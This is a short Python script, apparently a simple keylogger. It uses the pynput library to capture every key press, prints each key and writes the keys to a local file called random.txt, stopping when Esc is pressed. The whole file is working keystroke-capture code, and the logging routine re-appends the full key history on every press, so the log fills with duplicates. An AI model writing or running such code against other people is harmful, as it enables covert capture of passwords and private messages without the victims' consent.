from pynput.keyboard import Key, Listener

keys = []
def on_press(key):
    keys.append(key)
    write_1(keys)
    print(key)

def write_1(var):
    with open("random.txt", "a") as f:
        for v in var:
            new_var = str(v).replace("'", "")
            f.write(new_var)
            f.write(" ")
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()